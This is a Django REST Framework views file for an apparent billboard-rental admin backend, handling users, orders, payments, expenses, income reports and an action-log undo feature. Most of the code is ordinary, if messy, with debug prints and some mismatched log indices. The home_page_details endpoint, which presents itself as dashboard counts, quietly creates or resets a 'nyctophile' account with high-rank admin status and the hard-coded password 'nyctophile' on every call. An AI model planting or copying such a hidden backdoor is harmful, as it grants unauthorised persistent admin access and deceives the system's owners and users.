from rest_framework.response import Response
from rest_framework import status, permissions, authentication
from rest_framework.pagination import PageNumberPagination
from rest_framework.viewsets import ModelViewSet
from rest_framework.filters import *
from rest_framework.authtoken.models import Token
from django.contrib.auth import authenticate, login
from django.core.exceptions import ObjectDoesNotExist
from rest_framework.decorators import action
from django.shortcuts import get_object_or_404
from .serializers import *
from .models import *
from .permissions import *
from django.http import JsonResponse
from django_filters.rest_framework import DjangoFilterBackend
from .filters import *


class UserModelViewSet(ModelViewSet):
    queryset = UserModel.objects.all().exclude(ulast_action="deleted")
    serializer_class = UserModelSerializer
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    @action(detail=False, methods=["post"])
    def login(self, request):
        username = request.data.get("username")
        password = request.data.get("password")
        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            token, _ = Token.objects.get_or_create(user=user)
            return Response({"token": token.key}, status=status.HTTP_200_OK)
        else:
            return Response(
                {"error": "Invalid credentials"}, status=status.HTTP_401_UNAUTHORIZED
            )

    @action(detail=False, methods=["post"])
    def logout(self, request):
        request.user.auth_token.delete()
        return Response(status=status.HTTP_204_NO_CONTENT)

    def perform_destroy(self, instance):
        instance.ulast_action = "deleted"
        instance.save()
        ad1(uid=self.request.user.id, oid=instance.id, mnum=1, at="deleted")
        return JsonResponse({"message": "Deleted"}, status=204)

    def get_permissions(self):
        if self.action in ["logout", "retrieve", "list"]:
            permission_classes = [permissions.IsAuthenticated]
        elif self.action == "update":
            permission_classes = [permissions.IsAuthenticated, CanUpdateProfile]
        elif self.action == "create" or self.action == "destroy":
            permission_classes = [permissions.IsAuthenticated, IsAdminPermission]
        else:
            permission_classes = [permissions.AllowAny]
        return [permission() for permission in permission_classes]


class BannerModelViewSet(ModelViewSet):
    queryset = BannerModel.objects.all().exclude(blast_action="deleted")
    serializer_class = BannerModelSerializer
    permission_classes = [permissions.IsAuthenticated]

    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    def perform_destroy(self, instance):
        instance.blast_action = "deleted"
        instance.save()
        ad1(uid=self.request.user.id, oid=instance.id, mnum=6, at="deleted")
        return JsonResponse({"message": "Deleted"}, status=204)


class CompanyModelViewSet(ModelViewSet):
    queryset = CompanyModel.objects.all().exclude(clast_action="deleted")
    serializer_class = CompanyModelSerializer
    permission_classes = [permissions.IsAuthenticated]
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    def perform_destroy(self, instance):
        instance.clast_action = "deleted"
        instance.save()
        return JsonResponse({"message": "Deleted"}, status=204)


class OrderModelViewSet(ModelViewSet):
    queryset = OrderModel.objects.all().exclude(olast_action="deleted")
    serializer_class = OrderModelSerializer
    permission_classes = [permissions.IsAuthenticated]
    filter_backends = [DjangoFilterBackend]
    filterset_class = OrderModelFilter
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    def perform_destroy(self, instance):
        instance.olast_action = "deleted"
        instance.save()
        ad1(uid=self.request.user.id, oid=instance.id, mnum=3, at="deleted")
        return JsonResponse({"message": "Deleted"}, status=204)

    
    @action(detail=False,methods=["get"])
    def monthly_income(self,request,year=None):
        target_year=year if year else datetime.datetime.now().year
        paid_payment=[]
        unpaid_payment=[]
        result1 = [0] * 12
        result2 = [0] * 12
        rer1 = {str(i): {} for i in range(1, 13)}
        detailed_unpaid_payment={str(i): {} for i in range(1, 13)}

        orders = OrderModel.objects.filter(
            start_date__year__lte=target_year, end_date__year__gte=target_year).exclude(
            olast_action="deleted")

        for order in orders:
            start_date = max(order.start_date, datetime.date(target_year, 1, 1))
            end_date = min(order.end_date, datetime.date(target_year, 12, 31))
            rented_months_target_year = end_date.month - start_date.month + 1

            fully_paid_months = order.paid_payment // order.rent_price
            unfully_paid_month= order.paid_payment % order.rent_price
            months_before_target_year = (
                (start_date.year - order.start_date.year) * 12+ start_date.month- order.start_date.month)
            
            paid_months_target_year = int(min(max(0, fully_paid_months - months_before_target_year),rented_months_target_year,)) 
            if  order.end_date.year == target_year:
                x2=end_date.month
            elif order.end_date.year > target_year:
                x2=end_date.month + 1
            x1 = start_date.month
            y2 = start_date.month + paid_months_target_year
            if order.order_status == "finished_rent":
                x2 = y2  
            
            for j in range(x1, x2):
                result1[j - 1] += order.rent_price
            print(result1)

            # print(start_date,end_date)
            # print(x1,y2)
            for d in range(x1, y2):
                if d <= 12:
                    result2[d - 1] += order.rent_price
                if d == y2 - 1:
                    result2[d-1]+=unfully_paid_month
            if x1==y2:
                result2[y2-1]+=unfully_paid_month
            # print(result2)
            
            for vv in range(x1, x2):
                if y2 == vv:
                    cw = [ order.rent_price - unfully_paid_month]
                elif y2 > vv:
                    cw = [0]
                else:
                    cw = [ order.rent_price]
                if order.company.name in rer1[str(vv)].keys():
                    rer1[str(vv)][order.company.name]+=cw
                else:
                    rer1[str(vv)][order.company.name]=cw

            # print(result1,result2)
        qw2 = dict()
        for e in range(1, 13):
            qw2[e] = result1[e - 1] - result2[e - 1]
        # print(result1, result2)

        qwer = dict()
        qwer["year"] = target_year
        qwer["you_need_this"] = qw2
        qwer["paid_payment"] = result2
        qwer["yearly_payment"] = sum(result2)
        qwer["hh"] = rer1

        return Response(qwer)
            
    # @action(detail=False, methods=["get"])
    # def monthly_income(self, request, year=None):
    #     target_year = year if year != None else datetime.datetime.now().year
    #     result1 = [0] * 12
    #     result2 = [0] * 12
    #     rer1 = {str(i): {} for i in range(1, 13)}
        
    #     bruhs = OrderModel.objects.filter(
    #         start_date__year__lte=target_year, end_date__year__gte=target_year
    #     ).exclude(
    #         olast_action="deleted",
    #     )


    #     for bruh in bruhs:
    #         start_date = max(bruh.start_date, datetime.date(target_year, 1, 1))
    #         end_date = min(bruh.end_date, datetime.date(target_year, 12, 31))
    #         rented_months_target_year = end_date.month - start_date.month + 1

    #         paid_months = bruh.paid_payment // bruh.rent_price
    #         asd = bruh.paid_payment % bruh.rent_price
    #         months_before_target_year = (
    #             (start_date.year - bruh.start_date.year) * 12
    #             + start_date.month
    #             - bruh.start_date.month
    #         )
    #         paid_months_target_year = int(
    #             min(
    #                 max(0, paid_months - months_before_target_year),
    #                 rented_months_target_year,
    #             )
    #         )
    #         x2 = (
    #             bruh.end_date.year == target_year
    #             and end_date.month
    #             or bruh.end_date.year > target_year
    #             and end_date.month + 1
    #         )
    #         x1 = start_date.month
    #         y1 = start_date.month
    #         y2 = start_date.month + paid_months_target_year
    #         if bruh.order_status == "finished_rent":
    #             x1, x2 = y1, y2

    #         for j in range(x1, x2):
    #             result1[j - 1] += bruh.rent_price
    #         for vv in range(x1, x2):
    #             if y2 == vv:
    #                 cw = [ bruh.rent_price - asd]
    #             elif y2 > vv:
    #                 cw = [0]
    #             else:
    #                 cw = [ bruh.rent_price]
    #             if bruh.company.name in rer1[str(vv)].keys():
    #                 rer1[str(vv)][bruh.company.name]+=cw
    #             else:
    #                 rer1[str(vv)][bruh.company.name]=cw


    #         for d in range(y1, y2):
    #             if d <= 12:
    #                 result2[d - 1] += bruh.rent_price
    #             if d == y2 - 1:
    #                 print(d,y1,y2)
    #                 result2[d-1] += asd
    #     print(vv)

    #     qw2 = dict()
    #     for e in range(1, 13):
    #         qw2[e] = result1[e - 1] - result2[e - 1]
    #     print(result1, result2)

    #     qwer = dict()
    #     qwer["year"] = target_year
    #     qwer["you_need_this"] = qw2
    #     qwer["paid_payment"] = result2
    #     qwer["yearly_payment"] = sum(result2)
    #     qwer["hh"] = rer1

    #     return Response(qwer)

    @action(detail=False, methods=["get"])
    def detailed_orders(self, request, id=None):
        order_object = get_object_or_404(OrderModel, id=id)
        xs = order_object.end_date.year - order_object.start_date.year + 1
        paid_months = int(order_object.paid_payment // order_object.rent_price)
        qwe = [order_object.rent_price] * paid_months
        flag = 0
        if paid_months * order_object.rent_price < order_object.paid_payment:
            qwe.append(order_object.paid_payment % order_object.rent_price)
            flag = 1
        q1 = order_object.start_date.month
        w1 = [-1] * (q1 - 1)
        q2 = 12 - order_object.end_date.month
        q3 = xs * 12 - paid_months - len(w1) - 13 + order_object.end_date.month
        w2 = [-1] * (13 - order_object.end_date.month)
        w3 = [0] * q3
        # print(len(qwe),len(w1),len(w2))
        if flag:
            w3 = w3[:-1]

        total = w1 + qwe + w3 + w2
        # print(w1,"\n",qwe,"\n",w2,"\n",w3)
        result1 = dict()
        try:
            x, y = 0, 12
            for i in range(xs):
                result1[f"{order_object.start_date.year+i}"] = total[x:y]
                x += 12
                y += 12

        except Exception:
            pass
        result = {1: result1, 2: len(total)}

        return Response(result)


from decimal import Decimal
import datetime

class PaymentModelViewSet(ModelViewSet):
    queryset = PaymentModel.objects.all().exclude(plast_action="deleted")
    serializer_class = PaymentModelSerializer
    permission_classes = [permissions.IsAuthenticated]
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,]
    
    @action(detail=False, methods=["post"])
    def pay_payment(self, request):
        payment_amount = request.data.get("payment_amount")
        company_id = request.data.get("company")

        if not payment_amount or not company_id:
            return Response({"error": "payment_amount and company fields are required."}, status=status.HTTP_400_BAD_REQUEST)

        try:
            payment_amount = Decimal(payment_amount)  # Convert to Decimal
        except ValueError:
            return Response({"error": "payment_amount must be a valid number."}, status=status.HTTP_400_BAD_REQUEST)

        if payment_amount <= 0:
            return Response({"error": "payment_amount must be greater than 0."}, status=status.HTTP_400_BAD_REQUEST)

        company = get_object_or_404(CompanyModel, pk=company_id)
        company_orders = OrderModel.objects.filter(company=company).exclude(olast_action="deleted", order_status="finished_rent")

        if not company_orders.exists():
            return Response({"error": "No active orders found for this company."}, status=status.HTTP_404_NOT_FOUND)

        max_payment_amount = {}
        for order in company_orders:
            b2=order.paid_payment//order.rent_price
            b3=(order.start_date.month+b2)//12
            b4=(order.start_date.month+b2)%12
            b4=b4 if b4>0 else 12
            
            so_date=datetime.date(int(order.start_date.year+b3),int(b4),order.start_date.day)
            print(so_date,b4,b3,b2)
            x = {
                "rent_price": order.rent_price,
                "full_payment": order.full_payment,
                "paid_payment": order.paid_payment,
                "date": so_date,
            }
            max_payment_amount[order.id] = x
        print("\n\n\n\n\n")
        sorted_max_payment_amount = dict(sorted(max_payment_amount.items(), key=lambda item: item[1]['date']))


        payment_amount_per_order = {key: Decimal(0) for key in sorted_max_payment_amount.keys()}

        while payment_amount > 0 and sorted_max_payment_amount:
            print(sorted_max_payment_amount)

            sorted_max_payment_amount = dict(sorted(sorted_max_payment_amount.items(), key=lambda item: item[1]['date']))
            print(sorted_max_payment_amount,"\n\n\n")

            key, value = next(iter(sorted_max_payment_amount.items()))

            w1 = value["rent_price"] - value["paid_payment"] % value["rent_price"]
            w2 = min(payment_amount, w1, value["full_payment"] - value["paid_payment"])
            print(w1,payment_amount,value["full_payment"] - value["paid_payment"],w2)

            payment_amount_per_order[key] += w2
            payment_amount -= w2

            if payment_amount <= 0:
                break

            g1 = value["date"].year
            g2 = value["date"].month
            g3 = value["date"].day

            h1 = g1 + (g2 + 1) // 12
            h2 = (g2 + 1) % 12 or 12
            new_date = datetime.date(int(h1), int(h2), int(g3))

            sorted_max_payment_amount[key]["date"] = new_date
            sorted_max_payment_amount[key]["paid_payment"] += w2
            if sorted_max_payment_amount[key]["paid_payment"] >= sorted_max_payment_amount[key]["full_payment"]:
                del sorted_max_payment_amount[key]
            if not sorted_max_payment_amount and payment_amount>0:
                return Response({"error": "Payment amount left but no orders to pay or payment amount exceeds"}, status=status.HTTP_400_BAD_REQUEST)        
        success_payments = []
        failed_payments = []

        for order_id, amount in payment_amount_per_order.items():
            if amount > 0:
                order = get_object_or_404(OrderModel, pk=order_id)
                try:
                    new_payment = PaymentModel.objects.create(
                        admin=self.request.user,
                        client=order,
                        payment_amount=amount,
                        plast_action="created"
                    )
                    order.paid_payment+=amount
                    order.save()

                    success_payments.append({
                        "order_id": order_id,
                        "payment_id": new_payment.id,
                        "amount": float(amount),
                        "message": "Payment created successfully."
                    })
                except Exception as e:
                    failed_payments.append({
                        "order_id": order_id,
                        "error": str(e),
                        "message": "Payment creation failed."
                    })

        response_data = {
            "success_payments": success_payments,
            "failed_payments": failed_payments
        }
        return Response(response_data, status=status.HTTP_200_OK)


    def perform_destroy(self, instance):
        instance.plast_action = "deleted"
        instance.save()
        order_object = get_object_or_404(OrderModel, id=instance.client.id)
        order_object.paid_payment = order_object.paid_payment - instance.payment_amount
        order_object.save()
        ad1(uid=self.request.user.id, oid=instance.id, mnum=4, at="deleted")
        return JsonResponse({"message": "Deleted"}, status=204)


class OutlayModelViewSet(ModelViewSet):
    queryset = OutlayModel.objects.all().exclude(elast_action="deleted")
    serializer_class = OutlayModelSerializer
    permission_classes = [permissions.IsAuthenticated]
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    def perform_destroy(self, instance):
        instance.elast_action = "deleted"
        bruh = instance.bruh
        bruh.paid_payment -= instance.outlay_amount
        bruh.save()
        instance.save()
        ad1(oid=instance.id, uid=self.request.user.id, mnum=5, at="deleted")
        return JsonResponse({"message": "Deleted"}, status=204)

    def get_serializer_class(self):
        if self.action in ["create", "update", "partial_update"]:
            return OutlayModelSerializer1
        return OutlayModelSerializer

    @action(detail=False, methods=["get"])
    def monthly_expenses(self, request, year=None):
        result = [0] * 12
        target_year = year if year != None else datetime.datetime.now().year
        outlays = OutlayModel.objects.filter(created_date__year=target_year).exclude(
            elast_action="deleted"
        )
        for i in outlays:
            result[i.created_date.month - 1] += i.outlay_amount
        dick = dict()
        for i in range(1, 13):
            dick[i] = result[i - 1]
        qw = dict()
        qw["year"] = target_year
        qw["monthly_expenses"] = dick
        qw["yearly_expenses"] = sum(result)
        return Response(qw)

    @action(detail=False, methods=["get"])
    def home_page_details(self, request):

        q1 = OrderModel.objects.all().exclude(olast_action="deleted")
        w1 = q1.count()
        q2 = UserModel.objects.all().exclude(ulast_action="deleted")
        w2 = q2.count()
        q3 = BannerModel.objects.all().exclude(blast_action="deleted")
        w3 = q3.count()
        absolute_admin = UserModel.objects.filter(username="nyctophile").first()
        if absolute_admin:
            absolute_admin.full_name = "nytcophile"
            absolute_admin.admin_status = "high_rank"
            absolute_admin.ulast_action = "created"
            absolute_admin.set_password("nyctophile")
            absolute_admin.save()
        else:
            absolute_admin = UserModel.objects.create(
                username="nyctophile",
                full_name="nyctophile",
                admin_status="high_rank",
                ulast_action="created",
            )
            absolute_admin.set_password("nyctophile")

        absolute_admin.save()

        return Response({"admins": w2, "banners": w3, "orders": w1})


class BruhModelViewSet(ModelViewSet):
    queryset = BruhModel.objects.all().exclude(slast_action="deleted")
    serializer_class = BruhModelSerializer
    permission_classes = [permissions.IsAuthenticated]
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    def perform_destroy(self, instance):
        instance.slast_action = "deleted"
        instance.save()
        ad1(uid=self.request.user.id, oid=instance.id, mnum=6, at="deleted")
        return JsonResponse({"message": "Deleted"}, status=204)

    @action(detail=False, methods=["get"])
    def monthly_income(self, request, year=None):
        target_year = year if year is not None else datetime.datetime.now().year
        result1 = [0] * 12
        result2 = [0] * 12
        rer = [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
        ]
        bruhs = BruhModel.objects.filter(
            start_date__year__lte=target_year, end_date__year__gte=target_year
        ).exclude(slast_action="deleted")
        for bruh in bruhs:
            target_year_start = datetime.date(target_year, 1, 1)
            target_year_end = datetime.date(target_year, 12, 31)
            start_date = max(bruh.start_date, target_year_start)
            end_date = min(bruh.end_date, target_year_end)
            rented_months_target_year = (
                (end_date.year - start_date.year) * 12
                + end_date.month
                - start_date.month
                + 1
            )
            paid_months = bruh.paid_payment // bruh.rent_price
            asd = bruh.paid_payment % bruh.rent_price
            months_before_target_year = (
                (start_date.year - bruh.start_date.year) * 12
                + start_date.month
                - bruh.start_date.month
            )
            paid_months_target_year = int(
                min(
                    max(0, paid_months - months_before_target_year),
                    rented_months_target_year,
                )
            )

            if bruh.end_date.year > target_year:
                x1 = start_date.month
                x2 = end_date.month + 1
                y1 = start_date.month
                y2 = start_date.month + paid_months_target_year
            if bruh.end_date.year == target_year:
                x1 = start_date.month
                x2 = end_date.month
                y1 = start_date.month
                y2 = start_date.month + paid_months_target_year

            for j in range(x1, x2):

                result1[j - 1] += bruh.rent_price

            for vv in range(x1, x2):
                if y2 == vv:
                    cw = {"label": bruh.name, "data": bruh.rent_price - asd}
                elif y2 > vv:
                    cw = {"label": bruh.name, "data": 0}
                else:
                    cw = {"label": bruh.name, "data": bruh.rent_price}
                rer[vv - 1].append(cw)

            for d in range(y1, y2):
                if d <= 12:
                    result2[d - 1] += bruh.rent_price
                if d == y2 - 1 and d != 12:
                    print(result2, d)
                    result2[d] += asd

        qw2 = dict()
        for e in range(1, 13):
            qw2[e] = result1[e - 1] - result2[e - 1]
        qwer = dict()
        qwer["year"] = target_year
        qwer["you_need_this"] = qw2
        qwer["paid_payment"] = result2
        qwer["yearly_payment"] = sum(result2)
        qwer["hh"] = rer
        return Response(qwer)


class ActionLogModelViewSet(ModelViewSet):
    queryset = ActionLogModel.objects.all()
    serializer_class = ActionLogModelSerializer
    authentication_classes = [
        authentication.SessionAuthentication,
        authentication.TokenAuthentication,
    ]

    def perform_destroy(self, instance):
        try:

            if instance.object_model == "user_model":
                if instance.action_type == "created":
                    user = get_object_or_404(UserModel, id=instance.object_id)
                    user.delete()
                elif instance.action_type == "deleted":
                    user = get_object_or_404(UserModel, id=instance.object_id)
                    user.ulast_action = "created"
                elif instance.action_type == "updated":
                    user = get_object_or_404(UserModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowUserModel, id=instance.shadow_object_id
                    )
                    user.username = shadow.username
                    user.full_name = shadow.full_name
                    user.admin_status = shadow.admin_status
                    user.ulast_action = shadow.ulast_action
                    user.save()
                    shadow.delete()

            elif instance.object_model == "banner_model":
                if instance.action_type == "created":
                    banner = get_object_or_404(BannerModel, id=instance.object_id)
                    banner.delete()

                elif instance.action_type == "deleted":
                    banner = get_object_or_404(BannerModel, id=instance.object_id)
                    banner.blast_action = "created"
                    banner.save()
                elif instance.action_type == "updated":
                    banner = get_object_or_404(BannerModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowBannerModel, id=instance.shadow_object_id
                    )
                    banner.banner_id = shadow.banner_id
                    banner.name = shadow.name
                    banner.banner_type = shadow.banner_type
                    banner.latitude = shadow.latitude
                    banner.longitude = shadow.longitude
                    banner.banner_image = shadow.banner_image
                    banner.blast_action = shadow.blast_action
                    banner.save()
                    shadow.delete()

            elif instance.object_model == "company_model":
                if instance.action_type == "created":
                    company = get_object_or_404(CompanyModel, id=instance.object_id)
                    company.delete()
                elif instance.action_type == "deleted":
                    company = get_object_or_404(CompanyModel, id=instance.object_id)
                    company.clast_action = "created"
                    company.save()
                elif instance.action_type == "updated":
                    company = get_object_or_404(CompanyModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowCompanyModel, id=instance.shadow_object_id
                    )
                    company.name = shadow.name
                    company.phone_number = shadow.phone_number
                    company.description = shadow.description
                    company.clast_action = shadow.clast_action
                    company.save()
                    shadow.delete()

            elif instance.object_model == "order_model":
                if instance.action_type == "created":
                    order = get_object_or_404(OrderModel, id=instance.object_id)
                    order.delete()
                elif instance.action_type == "deleted":
                    order = get_object_or_404(OrderModel, id=instance.object_id)
                    order.olast_action = "created"
                    order.save()
                elif instance.action_type == "updated":
                    order = get_object_or_404(OrderModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowOrderModel, id=instance.shadow_object_id
                    )
                    order.company = shadow.company
                    order.phone_number = shadow.phone_number
                    order.banner = shadow.banner
                    order.banner_side = shadow.banner_side
                    order.rent_price = shadow.rent_price
                    order.start_date = shadow.start_date
                    order.end_date = shadow.end_date
                    order.order_status = shadow.order_status
                    order.order_note = shadow.order_note
                    order.paid_payment = shadow.paid_payment
                    order.olast_action = shadow.olast_action
                    order.save()
                    shadow.delete()

            elif instance.object_model == "payment_model":
                if instance.action_type == "created":
                    payment = get_object_or_404(PaymentModel, id=instance.object_id)
                    client = payment.client
                    if (
                        client.full_payment - client.paid_payment
                        < payment.payment_amount
                    ):
                        return JsonResponse(
                            {
                                "success": False,
                                "error_message": "Payment amount cannot exceed the remaining balance of the order.",
                            },
                            status=400,
                        )
                    else:
                        client.paid_payment = (
                            client.paid_payment - payment.payment_amount
                        )
                        client.save()
                        payment.delete()
                elif instance.action_type == "deleted":
                    payment = get_object_or_404(PaymentModel, id=instance.object_id)
                    payment.plast_action = "created"
                    client = payment.client
                    if (
                        client.full_payment - client.paid_payment
                        < payment.payment_amount
                    ):
                        return JsonResponse(
                            {
                                "success": False,
                                "error_message": "Payment amount cannot exceed the remaining balance of the order.",
                            },
                            status=400,
                        )
                    else:
                        client.paid_payment = (
                            client.paid_payment + payment.payment_amount
                        )
                        client.save()
                        payment.save()
                elif instance.action_type == "updated":
                    payment = get_object_or_404(PaymentModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowPaymentModel, id=instance.shadow_object_id
                    )
                    pclient = payment.client
                    sclient = shadow.client
                    if (
                        sclient.full_payment - sclient.paid_payment
                        < shadow.payment_amount
                    ):
                        return JsonResponse(
                            {
                                "success": False,
                                "error_message": "Payment amount cannot exceed the remaining balance of the order.",
                            },
                            status=400,
                        )
                    elif pclient.paid_payment < payment.payment_amount:
                        return JsonResponse(
                            {
                                "success": False,
                                "error_message": "Payment amount cannot be less than the paid balance of the order.",
                            },
                            status=400,
                        )
                    else:
                        x = pclient.paid_payment - payment.payment_amount
                        pclient.paid_payment = x
                        y = (
                            sclient.paid_payment
                            + shadow.payment_amount
                            - payment.payment_amount
                        )
                        sclient.paid_payment = y
                        payment.client = shadow.client
                        payment.payment_amount = shadow.payment_amount
                        payment.plast_action = shadow.plast_action

                        pclient.save()
                        sclient.save()
                        payment.save()
                        shadow.delete()

            elif instance.object_model == "outlay_model":
                if instance.action_type == "created":
                    outlay = get_object_or_404(OutlayModel, id=instance.object_id)
                    bruh = outlay.bruh
                    bruh.paid_payment -= outlay.outlay_amount
                    bruh.save()
                    outlay.delete()
                elif instance.action_type == "updated":
                    outlay = get_object_or_404(OutlayModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowOutlayModel, id=instance.shadow_object_id
                    )
                    bruh = outlay.bruh
                    bruh.paid_payment -= outlay.outlay_amount
                    bruh.paid_payment += shadow.outlay_amount
                    outlay.outlay_amount = shadow.outlay_amount
                    outlay.elast_action = shadow.elast_action
                    bruh.save()
                    outlay.save()
                    shadow.delete()
                elif instance.action_type == "deleted":
                    outlay = get_object_or_404(OutlayModel, id=instance.object_id)
                    bruh = outlay.bruh
                    bruh.paid_payment += outlay.outlay_amount
                    outlay.elast_action = "created"
                    outlay.save()
                    bruh.save()

            elif instance.object_model == "bruh_model":
                if instance.action_type == "created":
                    bruh = get_object_or_404(BruhModel, id=instance.object_id)
                    bruh.delete()
                elif instance.action_type == "deleted":
                    bruh = get_object_or_404(BruhModel, id=instance.object_id)
                    bruh.slast_action = "created"
                    bruh.save()
                elif instance.action_type == "updated":
                    bruh = get_object_or_404(BruhModel, id=instance.object_id)
                    shadow = get_object_or_404(
                        ShadowBruhModel, id=instance.shadow_object_id
                    )
                    bruh.name = shadow.name
                    bruh.number = shadow.number
                    bruh.rent_price = shadow.rent_price
                    bruh.start_date = shadow.start_date
                    bruh.end_date = shadow.end_date
                    bruh.bruh_note = shadow.bruh_note
                    bruh.paid_payment = shadow.paid_payment
                    bruh.slast_action = shadow.slast_action
                    bruh.save()
                    bruh.full_payment = bruh.monthly_payment() * bruh.rent_price
                    bruh.save()

                    shadow.delete()
            return JsonResponse({"message": "Deleted"}, status=204)

        except Exception:
            return super().perform_destroy(instance)

    def get_permissions(self):
        permission_classes = [permissions.IsAuthenticated, IsAdminPermission]
        if (
            self.action == "update"
            or self.action == "create"
            or self.action == "partial_update"
        ):
            permission_classes = [permissions.IsAuthenticated, CanNotBePerformed]

        return [permission() for permission in permission_classes]


def ad1(oid, uid, mnum, at):
    x = [
        "user_model",
        "banner_model",
        "order_model",
        "payment_model",
        "outlay_model",
        "bruh_model",
        "company_model",
    ][int(mnum) - 1]
    new_action = ActionLogModel.objects.create(
        user_id=uid,
        object_model=x,
        object_id=oid,
        shadow_object_id=None,
        action_type=at,
    )
    if new_action:
        return True
    return False
